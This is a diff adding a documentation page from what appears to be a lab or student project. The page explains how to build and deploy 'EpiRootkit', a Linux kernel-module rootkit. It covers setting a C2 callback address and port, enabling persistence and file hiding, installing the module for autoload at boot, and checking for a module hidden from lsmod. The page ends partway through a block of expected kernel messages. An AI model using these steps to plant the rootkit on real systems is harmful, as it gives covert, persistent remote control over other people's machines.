@@ -1,0 +1,924 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><title>Build & Deployment | Tux Fan Club Docs</title>
+<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="How to build and load EpiRootkit on Ubuntu 20.04"><meta name=keywords content="Documentation,Hugo,Hugo Theme,Bootstrap"><meta name=author content="Colin Wilson - Lotus Labs"><meta name=email content="support@aigis.uk"><meta name=website content="https://lotusdocs.dev"><meta name=Version content="v0.1.0"><link rel=icon href=/favicon.ico sizes=any><link rel=icon type=image/svg+xml href=/favicon.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=/site.webmanifest><meta property="og:title" content="Build & Deployment"><meta property="og:description" content="How to build and load EpiRootkit on Ubuntu 20.04"><meta property="og:type" content="article"><meta property="og:url" content="/docs/05-epirootkit/deployment/"><meta property="og:image" content="/opengraph/card-base-2_hu_c41a748bbb42b7e6.png"><meta property="article:section" content="docs"><meta property="article:published_time" content="2025-05-07T00:44:31+01:00"><meta property="article:modified_time" content="2025-05-28T03:08:38+02:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/opengraph/card-base-2_hu_c41a748bbb42b7e6.png"><meta name=twitter:title content="Build & Deployment"><meta name=twitter:description content="How to build and load EpiRootkit on Ubuntu 20.04"><link rel=alternate type=application/atom+xml title="Atom feed for Tux Fan Club Docs" href=/index.xml><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><script type=text/javascript src=/docs/js/flexsearch.bundle.min.249548594cb6843f3060a3cdd3043799676c59ce8db83358a3fc2e4d20598d05dfa6ce4994805d2835cb33b54dc9b9e7.js integrity=sha384-JJVIWUy2hD8wYKPN0wQ3mWdsWc6NuDNYo/wuTSBZjQXfps5JlIBdKDXLM7VNybnn crossorigin=anonymous></script><link rel=preconnect href=https://fonts.gstatic.com/><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link href="https://fonts.googleapis.com/css?family=Inter:300,400,600,700|Fira+Code:500,700&display=block" rel=stylesheet><link rel=stylesheet href=/docs/scss/style.min.47627c508718021a8811f17bfd419041ce97729127a3db8f6bcf7c26c29fbacf37e002e618d60350aae90d89464e8447.css integrity=sha384-R2J8UIcYAhqIEfF7/UGQQc6XcpEno9uPa898JsKfus834ALmGNYDUKrpDYlGToRH crossorigin=anonymous></head><body><div class=content><div class="page-wrapper toggled"><nav id=sidebar class=sidebar-wrapper><div class=sidebar-brand><a href=/ aria-label=HomePage alt=HomePage><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></a></div><div class=sidebar-content style="height:calc(100% - 131px)"><ul class=sidebar-menu><li><a class=sidebar-root-link href=/docs/06-web-ui/installation/><i class="material-icons me-2"></i>
+Installation & Setup</a></li><li><a class=sidebar-root-link href=/docs/01-introduction/presentation/><i class="material-icons me-2">code</i>
+Presentation</a></li><li class=sidebar-dropdown><button class=btn>
+<i class="material-icons me-2">code</i>
+Setup</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/02-setup/environment/>Initial Setup & Installation</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/vm-installation/>VM Installation & Verification</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/attacking-vm-setup/>Attacking VM Setup</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/victim-vm-setup/>Victim VM Setup</a></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
+<i class="material-icons me-2">notes</i>
+Attacking Program (C2 Server)</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/03-attacking-program/overview/>Overview</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/installation/>Installation</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/commands/>Command Reference</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/usage/>Usage Guide</a></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
+<i class="material-icons me-2">monitor</i>
+Web UI (C2 Frontend)</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/04-web-ui/overview/>Overview</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/installation/>Installation & Setup</a></li><li class="sidebar-dropdown nested"><button class=btn>
+Features</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
+UI Panels</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/terminal-panel/>Terminal Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/persistence-panel/>Persistence Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/event-log-panel/>Event Log Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/upload-download-panel/>Upload/Download Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/overview-panel/>Overview Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/configuration-panel/>Configuration Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/authentication-panel/>Authentication Panel</a></li></ul></div></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/authentication/>Authentication</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/dashboard/>Dashboard</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/client-management/>Client Management</a></li></ul></div></li></ul></div></li><li class="sidebar-dropdown current active"><button class=btn>
+<i class="material-icons me-2">shield</i>
+EpiRootkit</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=/docs/05-epirootkit/configuration-justifications/>Configuration Justifications</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/overview/>EpiRootkit Overview</a></li><li class=current><a class=sidebar-nested-link href=/docs/05-epirootkit/deployment/>Build & Deployment</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/connection-authentication/>Connection & Authentication</a></li><li class="sidebar-dropdown nested"><button class=btn>
+Features</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/command-execution/>Command Execution</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/file-transfer/>File Transfer</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/hiding/>Stealth & Hiding</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/persistence/>Persistence</a></li></ul></div></li></ul></div></li><li><a class=sidebar-root-link href=/docs/06-bonuses/wlkom-ctf/><i class="material-icons me-2">savings</i>
+Tux Fan Club: Chasse au Trésor Pirate</a></li><li><a class=sidebar-root-link href=/docs/07-remerciements/thankyou/><i class="material-icons me-2">favorite</i>
+Un dernier mot</a></li></ul></div><ul class="sidebar-footer list-unstyled mb-0"></ul></nav><main class="page-content bg-transparent"><div id=top-header class="top-header d-print-none"><div class="header-bar d-flex justify-content-between"><div class="d-flex align-items-center"><a href=/ class="logo-icon me-3" aria-label=HomePage alt=HomePage><div class=small><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div><div class=big><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div></a><button id=close-sidebar class="btn btn-icon btn-soft">
+<span class="material-icons size-20 menu-icon align-middle">menu</span>
+</button>
+<button id=flexsearch-button class="ms-3 btn btn-soft" data-bs-toggle=collapse data-bs-target=#FlexSearchCollapse aria-expanded=false aria-controls=FlexSearchCollapse>
+<span class="material-icons size-20 menu-icon align-middle">search</span>
+<span class="flexsearch-button-placeholder ms-1 me-2 d-none d-sm-block">Search</span><div class="d-none d-sm-block"><span class=flexsearch-button-keys><kbd class=flexsearch-button-cmd-key><svg width="44" height="15"><path d="M2.118 11.5A1.519 1.519.0 011 11.042 1.583 1.583.0 011 8.815a1.519 1.519.0 011.113-.458h.715V6.643h-.71A1.519 1.519.0 011 6.185 1.519 1.519.0 01.547 5.071 1.519 1.519.0 011 3.958 1.519 1.519.0 012.118 3.5a1.519 1.519.0 011.114.458A1.519 1.519.0 013.69 5.071v.715H5.4V5.071A1.564 1.564.0 016.976 3.5 1.564 1.564.0 018.547 5.071 1.564 1.564.0 016.976 6.643H6.261V8.357h.715a1.575 1.575.0 011.113 2.685 1.583 1.583.0 01-2.227.0A1.519 1.519.0 015.4 9.929V9.214H3.69v.715a1.519 1.519.0 01-.458 1.113A1.519 1.519.0 012.118 11.5zm0-.857a.714.714.0 00.715-.714V9.214H2.118a.715.715.0 100 1.429zm4.858.0a.715.715.0 100-1.429H6.261v.715a.714.714.0 00.715.714zM3.69 8.357H5.4V6.643H3.69zM2.118 5.786h.715V5.071a.714.714.0 00-.715-.714.715.715.0 00-.5 1.22A.686.686.0 002.118 5.786zm4.143.0h.715a.715.715.0 00.5-1.22.715.715.0 00-1.22.5z" fill="currentcolor"/><path d="M12.4 11.475H11.344l3.879-7.95h1.056z" fill="currentcolor"/><path d="M25.073 5.384l-.864.576a2.121 2.121.0 00-1.786-.923 2.207 2.207.0 00-2.266 2.326 2.206 2.206.0 002.266 2.325 2.1 2.1.0 001.782-.918l.84.617a3.108 3.108.0 01-2.622 1.293 3.217 3.217.0 01-3.349-3.317 3.217 3.217.0 013.349-3.317A3.046 3.046.0 0125.073 5.384z" fill="currentcolor"/><path d="M30.993 5.142h-2.07v5.419H27.891V5.142h-2.07V4.164h5.172z" fill="currentcolor"/><path d="M34.67 4.164c1.471.0 2.266.658 2.266 1.851.0 1.087-.832 1.809-2.134 1.855l2.107 2.691h-1.28L33.591 7.87H33.07v2.691H32.038v-6.4zm-1.6.969v1.8h1.572c.832.0 1.22-.3 1.22-.918s-.411-.882-1.22-.882z" fill="currentcolor"/><path d="M42.883 10.561H38.31v-6.4h1.033V9.583h3.54z" fill="currentcolor"/></svg>
+</kbd><kbd class=flexsearch-button-key><svg width="15" height="15"><path d="M5.926 12.279H4.41L9.073 2.721H10.59z" fill="currentcolor"/></svg></kbd></span></div></button></div><div class="d-flex align-items-center"><ul class="list-unstyled mb-0"><li class="list-inline-item mb-0"><a href=https://github.com/KazeTachinuu/epirootkit-docs alt=github rel="noopener noreferrer" target=_blank><div class="btn btn-icon btn-default border-0"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>GitHub</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></div></a></li></ul><button id=mode class="btn btn-icon btn-default ms-2" type=button aria-label="Toggle user interface mode">
+<span class=toggle-dark><svg height="30" width="30" viewBox="0 0 48 48" fill="currentcolor"><title>Enable dark mode</title><path d="M24 42q-7.5.0-12.75-5.25T6 24t5.25-12.75T24 6q.4.0.85.025.45.025 1.15.075-1.8 1.6-2.8 3.95t-1 4.95q0 4.5 3.15 7.65Q28.5 25.8 33 25.8q2.6.0 4.95-.925T41.9 22.3q.05.6.075.975Q42 23.65 42 24q0 7.5-5.25 12.75T24 42zm0-3q5.45.0 9.5-3.375t5.05-7.925q-1.25.55-2.675.825Q34.45 28.8 33 28.8q-5.75.0-9.775-4.025T19.2 15q0-1.2.25-2.575t.9-3.125q-4.9 1.35-8.125 5.475Q9 18.9 9 24q0 6.25 4.375 10.625T24 39zm-.2-14.85z"/></svg>
+</span><span class=toggle-light><svg height="30" width="30" viewBox="0 0 48 48" fill="currentcolor"><title>Enable light mode</title><path d="M24 31q2.9.0 4.95-2.05T31 24t-2.05-4.95T24 17t-4.95 2.05T17 24t2.05 4.95T24 31zm0 3q-4.15.0-7.075-2.925T14 24t2.925-7.075T24 14t7.075 2.925T34 24t-2.925 7.075T24 34zM3.5 25.5q-.65.0-1.075-.425Q2 24.65 2 24t.425-1.075Q2.85 22.5 3.5 22.5h5q.65.0 1.075.425Q10 23.35 10 24t-.425 1.075T8.5 25.5zm36 0q-.65.0-1.075-.425Q38 24.65 38 24t.425-1.075T39.5 22.5h5q.65.0 1.075.425Q46 23.35 46 24t-.425 1.075-1.075.425zM24 10q-.65.0-1.075-.425Q22.5 9.15 22.5 8.5v-5q0-.65.425-1.075Q23.35 2 24 2t1.075.425T25.5 3.5v5q0 .65-.425 1.075Q24.65 10 24 10zm0 36q-.65.0-1.075-.425T22.5 44.5v-5q0-.65.425-1.075Q23.35 38 24 38t1.075.425.425 1.075v5q0 .65-.425 1.075Q24.65 46 24 46zM12 14.1l-2.85-2.8q-.45-.45-.425-1.075.025-.625.425-1.075.45-.45 1.075-.45t1.075.45L14.1 12q.4.45.4 1.05.0.6-.4 1-.4.45-1.025.45T12 14.1zm24.7 24.75L33.9 36q-.4-.45-.4-1.075t.45-1.025q.4-.45 1-.45t1.05.45l2.85 2.8q.45.45.425 1.075-.025.625-.425 1.075-.45.45-1.075.45t-1.075-.45zM33.9 14.1q-.45-.45-.45-1.05.0-.6.45-1.05l2.8-2.85q.45-.45 1.075-.425.625.025 1.075.425.45.45.45 1.075t-.45 1.075L36 14.1q-.4.4-1.025.4t-1.075-.4zM9.15 38.85q-.45-.45-.45-1.075t.45-1.075L12 33.9q.45-.45 1.05-.45.6.0 1.05.45.45.45.45 1.05.0.6-.45 1.05l-2.8 2.85q-.45.45-1.075.425-.625-.025-1.075-.425zM24 24z"/></svg></span></button></div></div><div class=collapse id=FlexSearchCollapse><div class=flexsearch-container><div class=flexsearch-keymap><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd>
+<kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd>
+<span class=flexsearch-key-label>to navigate</span></li><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd>
+<span class=flexsearch-key-label>to select</span></li><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd>
+<span class=flexsearch-key-label>to close</span></li></div><form class="flexsearch position-relative flex-grow-1 ms-2 me-2"><div class="d-flex flex-row"><input id=flexsearch class=form-control type=search placeholder=Search aria-label=Search autocomplete=off>
+<button id=hideFlexsearch type=button class="ms-2 btn btn-soft">
+cancel</button></div><div id=suggestions class="shadow rounded-1 d-none"></div></form></div></div></div><div class=container-fluid><div class=layout-spacing><div class="d-md-flex justify-content-between align-items-center"><nav aria-label=breadcrumb class="d-inline-block pb-2 mt-1 mt-sm-0"><ul id=breadcrumbs class="breadcrumb bg-transparent mb-0" itemscope itemtype=https://schema.org/BreadcrumbList><li class="breadcrumb-item text-capitalize active" aria-current=page itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/><i class="material-icons size-20 align-text-bottom" itemprop=name>Home</i>
+</a><meta itemprop=position content='1'></li><li class="breadcrumb-item text-capitalize" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/05-epirootkit/><span itemprop=name>EpiRootkit</span>
+</a><meta itemprop=position content='2'></li><li class="breadcrumb-item text-capitalize active" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><span itemprop=name>Build & Deployment</span>
+<meta itemprop=position content='3'></li></ul></nav></div><div class="row flex-xl-nowrap"><div class="docs-toc col-xl-3 d-xl-block"><toc><div class="fw-bold text-uppercase mb-2">On this page</div><nav id=toc><ul><li><a href=#build--deployment>Build & Deployment</a><ul><li><a href=#deployment-architecture>Deployment Architecture</a></li><li><a href=#requirements>Requirements</a><ul><li><a href=#system>System</a></li><li><a href=#dependencies>Dependencies</a></li></ul></li><li><a href=#build-process>Build Process</a><ul><li><a href=#1-navigate-to-rootkit-directory>1. Navigate to Rootkit Directory</a></li><li><a href=#2-build-the-module>2. Build the Module</a></li><li><a href=#3-verify-build>3. Verify Build</a></li></ul></li><li><a href=#configuration>Configuration</a><ul><li><a href=#network-settings>Network Settings</a></li><li><a href=#feature-settings>Feature Settings</a></li></ul></li><li><a href=#deployment-methods>Deployment Methods</a><ul><li><a href=#method-1-deployment-script-recommended>Method 1: Deployment Script (Recommended)</a></li><li><a href=#method-2-manual-loading-basic>Method 2: Manual Loading (Basic)</a></li><li><a href=#verify-loading>Verify Loading</a></li></ul></li><li><a href=#deployment-management>Deployment Management</a><ul><li><a href=#check-status>Check Status</a></li><li><a href=#complete-removal>Complete Removal</a></li></ul></li><li><a href=#automatic-features>Automatic Features</a></li><li><a href=#module-management>Module Management</a><ul><li><a href=#unload-module>Unload Module</a></li><li><a href=#manual-persistence-cleanup>Manual Persistence Cleanup</a></li><li><a href=#clean-build>Clean Build</a></li></ul></li><li><a href=#file-locations>File Locations</a><ul><li><a href=#deployment-files-by-deploy-script>Deployment Files (by deploy script)</a></li><li><a href=#runtime-files-by-rootkit>Runtime Files (by rootkit)</a></li></ul></li><li><a href=#next-steps>Next Steps</a></li></ul></li></ul></nav></toc></div><div class="docs-toc-mobile d-print-none d-xl-none"><button id=toc-dropdown-btn class="btn-secondary dropdown-toggle" type=button data-bs-toggle=dropdown data-bs-offset=0,0 aria-expanded=false>
+Table of Contents</button><nav id=toc-mobile><ul class=dropdown-menu><li><a href=#build--deployment>Build & Deployment</a><ul><li><a href=#deployment-architecture>Deployment Architecture</a></li><li><a href=#requirements>Requirements</a><ul><li><a href=#system>System</a></li><li><a href=#dependencies>Dependencies</a></li></ul></li><li><a href=#build-process>Build Process</a><ul><li><a href=#1-navigate-to-rootkit-directory>1. Navigate to Rootkit Directory</a></li><li><a href=#2-build-the-module>2. Build the Module</a></li><li><a href=#3-verify-build>3. Verify Build</a></li></ul></li><li><a href=#configuration>Configuration</a><ul><li><a href=#network-settings>Network Settings</a></li><li><a href=#feature-settings>Feature Settings</a></li></ul></li><li><a href=#deployment-methods>Deployment Methods</a><ul><li><a href=#method-1-deployment-script-recommended>Method 1: Deployment Script (Recommended)</a></li><li><a href=#method-2-manual-loading-basic>Method 2: Manual Loading (Basic)</a></li><li><a href=#verify-loading>Verify Loading</a></li></ul></li><li><a href=#deployment-management>Deployment Management</a><ul><li><a href=#check-status>Check Status</a></li><li><a href=#complete-removal>Complete Removal</a></li></ul></li><li><a href=#automatic-features>Automatic Features</a></li><li><a href=#module-management>Module Management</a><ul><li><a href=#unload-module>Unload Module</a></li><li><a href=#manual-persistence-cleanup>Manual Persistence Cleanup</a></li><li><a href=#clean-build>Clean Build</a></li></ul></li><li><a href=#file-locations>File Locations</a><ul><li><a href=#deployment-files-by-deploy-script>Deployment Files (by deploy script)</a></li><li><a href=#runtime-files-by-rootkit>Runtime Files (by rootkit)</a></li></ul></li><li><a href=#next-steps>Next Steps</a></li></ul></li></ul></nav></div><div class="docs-content col-12 col-xl-9 mt-0"><div class="mb-0 d-flex"><i class="material-icons title-icon me-2">code</i><h1 class="content-title mb-0">Build & Deployment</h1></div><p class="lead mb-3">How to build and load EpiRootkit on Ubuntu 20.04</p><div id=content class=main-content data-bs-spy=scroll data-bs-root-margin="0px 0px -65%" data-bs-target=#toc-mobile><div data-prismjs-copy data-prismjs-copy-success data-prismjs-copy-error><h1 id=build--deployment>Build & Deployment <a href=#build--deployment class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h1><p>How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.</p><h2 id=deployment-architecture>Deployment Architecture <a href=#deployment-architecture class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><p>EpiRootkit follows a <strong>two-stage deployment</strong> approach:</p><ul><li><strong>Stage 1 (Loader)</strong>: <code>scripts/deploy_rootkit.sh</code> handles proper module deployment</li><li><strong>Stage 2 (Runtime)</strong>: Rootkit focuses on functionality, not self-deployment</li></ul><p>This separation follows Linux kernel module best practices and eliminates unusual self-copying behavior.</p><h2 id=requirements>Requirements <a href=#requirements class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=system>System <a href=#system class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><ul><li><strong>OS</strong>: Ubuntu 20.04 LTS</li><li><strong>Kernel</strong>: 5.4.0-* (check with <code>uname -r</code>)</li><li><strong>Architecture</strong>: x86_64</li></ul><h3 id=dependencies>Dependencies <a href=#dependencies class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=f1f2f46 class=language-bash>
+  <code>sudo apt update
+sudo apt install -y build-essential linux-headers-$(uname -r)</code>
+  </pre></div><h2 id=build-process>Build Process <a href=#build-process class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=1-navigate-to-rootkit-directory>1. Navigate to Rootkit Directory <a href=#1-navigate-to-rootkit-directory class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=4cc85a3 class=language-bash>
+  <code>cd rootkit</code>
+  </pre></div><h3 id=2-build-the-module>2. Build the Module <a href=#2-build-the-module class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=7e536ba class=language-bash>
+  <code>make clean &amp;&amp; make</code>
+  </pre></div><p><strong>Expected output:</strong></p><div class=prism-codeblock><pre id=3051e5d class=language->
+  <code>make -C /lib/modules/5.4.0-74-generic/build M=/path/to/rootkit modules
+  CC [M]  /path/to/rootkit/core/main.o
+  CC [M]  /path/to/rootkit/commands/commands.o
+  CC [M]  /path/to/rootkit/commands/auth_commands.o
+  CC [M]  /path/to/rootkit/commands/exec_commands.o
+  CC [M]  /path/to/rootkit/commands/file_commands.o
+  CC [M]  /path/to/rootkit/commands/status_commands.o
+  CC [M]  /path/to/rootkit/commands/stealth_commands.o
+  CC [M]  /path/to/rootkit/network/connection.o
+  CC [M]  /path/to/rootkit/network/socket.o
+  CC [M]  /path/to/rootkit/network/keepalive.o
+  CC [M]  /path/to/rootkit/stealth/stealth.o
+  CC [M]  /path/to/rootkit/persistence/persistence.o
+  CC [M]  /path/to/rootkit/security/auth.o
+  CC [M]  /path/to/rootkit/security/crypto.o
+  CC [M]  /path/to/rootkit/utils/sysfs.o
+  LD [M]  /path/to/rootkit/epirootkit.ko</code>
+  </pre></div><h3 id=3-verify-build>3. Verify Build <a href=#3-verify-build class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=1c5d736 class=language-bash>
+  <code>ls -la epirootkit.ko
+file epirootkit.ko</code>
+  </pre></div><p>Should show: <code>ELF 64-bit LSB relocatable, x86-64</code></p><h2 id=configuration>Configuration <a href=#configuration class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=network-settings>Network Settings <a href=#network-settings class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><p>Edit <code>rootkit/core/config.h</code> before building:</p><div class=prism-codeblock><pre id=26cef06 class=language-c>
+  <code>#define C2_SERVER_IP &#34;192.168.64.1&#34;    // Your C2 server IP
+#define C2_SERVER_PORT 4444             // C2 server port</code>
+  </pre></div><h3 id=feature-settings>Feature Settings <a href=#feature-settings class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=4526eb7 class=language-c>
+  <code>#define ENABLE_ENCRYPTION 0      // Encryption disabled
+#define ENABLE_PERSISTENCE 1     // Auto-install persistence
+#define ENABLE_FILE_HIDING 1     // Hide files with prefixes</code>
+  </pre></div><h2 id=deployment-methods>Deployment Methods <a href=#deployment-methods class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=method-1-deployment-script-recommended>Method 1: Deployment Script (Recommended) <a href=#method-1-deployment-script-recommended class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><p>Uses the proper loader stage for deployment:</p><div class=prism-codeblock><pre id=d8caae3 class=language-bash>
+  <code># Deploy using the deployment script
+sudo ./scripts/deploy_rootkit.sh
+
+# Or specify custom module path
+sudo ./scripts/deploy_rootkit.sh /path/to/epirootkit.ko</code>
+  </pre></div><p><strong>What the deployment script does:</strong></p><ol><li><strong>Validates</strong> module and root privileges</li><li><strong>Deploys module</strong> to <code>/lib/modules/$(uname -r)/extra/</code></li><li><strong>Sets up autoload</strong> via <code>/etc/modules-load.d/epirootkit.conf</code></li><li><strong>Updates dependencies</strong> with <code>depmod -a</code></li><li><strong>Loads module</strong> immediately</li><li><strong>Verifies</strong> deployment</li></ol><h3 id=method-2-manual-loading-basic>Method 2: Manual Loading (Basic) <a href=#method-2-manual-loading-basic class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><p>For development and testing:</p><div class=prism-codeblock><pre id=5afeb3a class=language-bash>
+  <code>sudo insmod epirootkit.ko</code>
+  </pre></div><h3 id=verify-loading>Verify Loading <a href=#verify-loading class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=16b9d83 class=language-bash>
+  <code># Check if loaded (may be hidden if stealth enabled)
+lsmod | grep epirootkit
+
+# Alternative check if module is hidden
+ls -la /sys/module/epirootkit
+
+# Check kernel messages
+dmesg | tail -10</code>
+  </pre></div><p><strong>Expected kernel messages:</strong></p><div class=prism-codeblock><pre id=10d064b class=language->
+  <code>[  123.456] EpiRootkit: Starting initialization (v1.0.0)
+[  123.457] EpiRootkit: Connection module initialized
+[  123.458] EpiRootkit: Stealth module initialized
+[  123.459] EpiRootkit: Persistence module initialized
